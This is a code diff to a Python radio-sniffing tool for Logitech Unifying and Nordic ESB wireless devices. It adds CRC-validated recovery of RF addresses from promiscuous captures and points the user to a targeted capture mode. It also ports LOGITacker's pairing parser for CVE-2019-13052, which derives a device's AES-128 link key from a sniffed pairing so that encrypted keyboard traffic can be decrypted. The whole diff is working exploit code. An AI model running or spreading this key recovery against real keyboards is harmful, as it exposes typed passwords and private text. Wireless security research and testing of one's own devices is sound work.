@@ -87,10 +87,56 @@ def describe_promisc_hit(ch: int, prefix: int, base: int, raw: bytes) -> str:
     c = esb_crc_best(prefix, base, raw)
     if c is None:
         return line + "  crc:noise"
-    tag = f"CRC-OK({c['order']}/{c['bitorder']}) pl={c['payload_len']} pay={c['payload'].hex()}"
+    dev = f"{c['device']:#04x}" if c['device'] is not None else "-"
+    tag = (f"CRC-OK({c['bitorder']}) addr={c['address'].hex().upper()} "
+           f"dev={dev} {esb_classify(c['payload'])} pl={c['payload_len']} pay={c['payload'].hex()}")
     if c['unifying']:
         tag += f" unifying {UNIFYING_LENS[c['payload_len']]} cksum={'ok' if c['cksum_ok'] else 'BAD'}"
     return line + "  " + tag
+
+
+# RF/DJ report-type byte (payload[1]) -> name. From Logitech's Unifying DJ
+# collection spec (the RF Report Type field) plus the Linux hid-logitech-dj
+# driver and lekensteyn/ltunify for the notification range. Bytes not listed
+# (incl. the RF-link keepalive/pairing/encrypted-keystroke types, which aren't
+# pinned by a public name=value) are shown raw rather than guessed.
+_RF_REPORT_TYPES = {
+    0x01: "keyboard", 0x02: "mouse", 0x03: "consumer-ctl", 0x04: "system-ctl",
+    0x08: "media-center", 0x0E: "kbd-leds", 0x10: "hidpp-short", 0x11: "hidpp-long",
+    0x40: "notif-unpaired", 0x41: "notif-paired", 0x42: "notif-conn-status",
+    0x4A: "notif-lock-changed", 0x4B: "notif-pair-accepted?", 0x7F: "notif-error",
+}
+
+
+def esb_classify(payload: bytes) -> str:
+    """Best-effort Unifying RF frame label. Names are the documented RF/DJ
+    report types keyed on payload[1]; a 22-byte payload is the encrypted-
+    keyboard shape (Bastille). Unknown type bytes are shown raw."""
+    if len(payload) < 2:
+        return "short"
+    rt = payload[1]
+    name = _RF_REPORT_TYPES.get(rt, f"type=0x{rt:02x}")
+    if len(payload) == 23:
+        name += " [encrypted-kbd shape]"
+    return name
+
+
+def promisc_addresses(recs):
+    """Distinct RF addresses recovered from the CRC-valid hits, each with its
+    seen device indices and hit count. These can be handed straight to the
+    known-address `esb` mode (standalone config esb --address <addr>)."""
+    found = {}
+    for ch, p, b, raw in recs:
+        c = esb_crc_best(p, b, raw)
+        if c is None:
+            continue
+        a = c['address'].hex().upper()
+        e = found.setdefault(a, {'count': 0, 'devices': set(), 'unifying': False})
+        e['count'] += 1
+        if c['device'] is not None:
+            e['devices'].add(c['device'])
+        e['unifying'] = e['unifying'] or c['unifying']
+    return found
 
 
 def promisc_hit_counts(recs):
@@ -112,10 +158,14 @@ def summarize_promisc(recs) -> str:
     unif = sum(1 for ch, p, b, raw in recs
                if (c := esb_crc_best(p, b, raw)) and c['unifying'])
     head = f"{len(recs)} hit(s) across {len(counts)} guess(es)"
-    if valid:
-        return (f"{head}; {valid} CRC-valid ({unif} Unifying) -- these are real frames, "
-                f"the rest are noise; top guesses: {top_str}")
-    return f"{head}; 0 CRC-valid (all noise so far); top: {top_str}"
+    if not valid:
+        return f"{head}; 0 CRC-valid (all noise so far); top: {top_str}"
+    addrs = promisc_addresses(recs)
+    addr_str = "; ".join(
+        f"{a} (x{d['count']}" + (f", dev {','.join(f'{x:#04x}' for x in sorted(d['devices']))}" if d['devices'] else "") + ")"
+        for a, d in sorted(addrs.items(), key=lambda kv: kv[1]['count'], reverse=True))
+    return (f"{head}; {valid} CRC-valid ({unif} Unifying) -- real frames. "
+            f"Addresses: {addr_str}. Feed one to: standalone config esb --address <addr>")
 
 
 # --- ESB CRC-16 validation of promisc captures ---------------------------
@@ -123,12 +173,12 @@ def summarize_promisc(recs) -> str:
 # A promisc hit is raw bits with CRC off (see esb_promisc_radio.h), so real
 # frames and noise matches look alike. nRF24/Nordic ESB appends a 2-byte
 # CRC-16/CCITT-FALSE (poly 0x1021, init 0xFFFF) computed MSB-first over the
-# contiguous on-air bitstream {address, 9-bit PCF, payload}. Prepending the
-# two matched address bytes to raw[] reconstructs that bitstream from its
-# start, so sliding the CRC boundary and checking for a match tells a real
-# frame from noise -- a false match is ~1/65536 per boundary. A match also
-# fixes the address byte order the capture leaves open (header unknown #1):
-# whichever prepend order validates is the on-air order.
+# contiguous on-air bitstream {address, 9-bit PCF, payload}. Preamble-sync
+# captures begin at that address, so sliding the CRC boundary over the raw bits
+# and checking for a match tells a real frame from noise -- a false match is
+# ~1/65536 per boundary -- and the leading addr_bytes of the matching bitstream
+# are the real RF address. The nRF52 stores bits LSBit-first, so the 'lsb'
+# (bit-reversed) pass is the one that validates on real hardware.
 
 def _bits_msb(data: bytes):
     out = []
@@ -182,10 +232,13 @@ def esb_crc_candidates(prefix: int, base: int, raw: bytes, addr_bytes: int = 5,
             if k + 16 > n:
                 break
             if _crc16_ccitt(bits[:k]) == _bits_to_int(bits[k:k + 16]):
+                address = bytes(_bits_to_int(bits[8 * i:8 * i + 8]) for i in range(addr_bytes))
                 payload = bytes(_bits_to_int(bits[hdr + 8 * i:hdr + 8 * i + 8]) for i in range(plen))
                 out.append({
                     'order': "none",
                     'bitorder': bitorder,
+                    'address': address,            # 5-byte RF address, reconstructed in the matching bit order
+                    'device': payload[0] if payload else None,   # Unifying device index (HID++ byte 0)
                     'payload_len': plen,
                     'payload': payload,
                     'crc': _bits_to_int(bits[k:k + 16]),
@@ -209,3 +262,109 @@ def esb_crc_best(prefix: int, base: int, raw: bytes):
         if c['unifying']:
             return c
     return cands[0]
+
+
+# --- Unifying pairing capture -> AES link-key derivation (CVE-2019-13052) ---
+#
+# Ported from LOGITacker (RoganDawes/LOGITacker, logitacker_pairing_parser.c).
+# A Unifying pairing is a cleartext RF handshake; capturing it recovers the
+# per-device AES-128 link key, which then decrypts keyboard traffic. Frames
+# here are ESB payloads (byte 0 = device index, byte 1 = report type), the same
+# payloads esb_crc_candidates yields. The device uses the global pairing
+# address BB:0A:DC:A5:75 during the exchange.
+UNIFYING_GLOBAL_PAIRING_ADDRESS = bytes([0xBB, 0x0A, 0xDC, 0xA5, 0x75])
+
+
+def classify_pairing_frame(payload: bytes):
+    """Pairing phase of one ESB payload, or None. Length + report-type (byte 1)
+    + phase (byte 2), exactly as LOGITacker's classify_frame."""
+    n = len(payload)
+    if n == 22 and payload[1] in (0x5f, 0xdf):                 # device -> dongle request
+        return {0x01: "req1", 0x02: "req2", 0x03: "req3"}.get(payload[2])
+    if n == 22 and payload[1] == 0x1f:                         # dongle -> device response
+        return {0x01: "rsp1", 0x02: "rsp2"}.get(payload[2])
+    if n == 10 and payload[1] == 0x0f:
+        return "rsp_final"
+    return None
+
+
+class UnifyingPairing:
+    """Accumulates pairing frames and derives the AES link key. Feed each
+    captured ESB payload to ingest(); once req1/req2/rsp1/rsp2 are in,
+    key_material_complete() is true and device_key() returns the 16-byte key."""
+
+    def __init__(self):
+        self.f = {}
+        self.seen = set()
+
+    def ingest(self, payload: bytes):
+        payload = bytes(payload)
+        cls = classify_pairing_frame(payload)
+        if cls == "req1":                                      # device WPID, type, caps
+            self.f["device_wpid"] = payload[9:11]
+            self.f["device_type"] = payload[13]
+            self.f["device_caps"] = payload[14]
+        elif cls == "req2":                                    # device nonce, serial
+            self.f["device_nonce"] = payload[3:7]
+            self.f["device_serial"] = payload[7:11]
+        elif cls == "req3":                                    # device name
+            nl = min(payload[4], 16)
+            self.f["device_name"] = payload[5:5 + nl]
+        elif cls == "rsp1":                                    # dongle WPID, assigned RF address
+            self.f["dongle_wpid"] = payload[9:11]
+            self.f["device_rf_address"] = payload[3:8]
+        elif cls == "rsp2":                                    # dongle nonce
+            self.f["dongle_nonce"] = payload[3:7]
+        elif cls != "rsp_final":
+            return None
+        self.seen.add(cls)
+        return cls
+
+    def key_material_complete(self) -> bool:
+        return {"req1", "req2", "rsp1", "rsp2"} <= self.seen
+
+    def raw_key_material(self) -> bytes:
+        f = self.f
+        return (bytes(f["device_rf_address"][:4]) + bytes(f["device_wpid"]) +
+                bytes(f["dongle_wpid"]) + bytes(f["device_nonce"]) + bytes(f["dongle_nonce"]))
+
+    def device_key(self) -> bytes:
+        r = self.raw_key_material()
+        k = bytearray(16)
+        k[2] = r[0]
+        k[1] = r[1] ^ 0xFF
+        k[5] = r[2] ^ 0xFF
+        k[3] = r[3]
+        k[14] = r[4]
+        k[11] = r[5]
+        k[9] = r[6]
+        k[0] = r[7]
+        k[8] = r[8]
+        k[6] = r[9] ^ 0x55
+        k[4] = r[10]
+        k[15] = r[11]
+        k[10] = r[12] ^ 0xFF
+        k[12] = r[13]
+        k[7] = r[14]
+        k[13] = r[15] ^ 0x55
+        return bytes(k)
+
+
+def unifying_pairing_key(payloads):
+    """Parse a captured pairing (iterable of ESB payloads) and return the
+    recovered key, or None if the key-material frames weren't all captured."""
+    p = UnifyingPairing()
+    for pl in payloads:
+        p.ingest(pl)
+    if not p.key_material_complete():
+        return None
+    name = p.f.get("device_name", b"")
+    return {
+        "address": p.f["device_rf_address"],
+        "raw_key_material": p.raw_key_material(),
+        "device_key": p.device_key(),
+        "device_wpid": p.f["device_wpid"],
+        "dongle_wpid": p.f["dongle_wpid"],
+        "device_name": name.decode("latin1", "replace") if name else "",
+        "full_pairing": {"req1", "req2", "req3", "rsp1", "rsp2", "rsp_final"} <= p.seen,
+    }
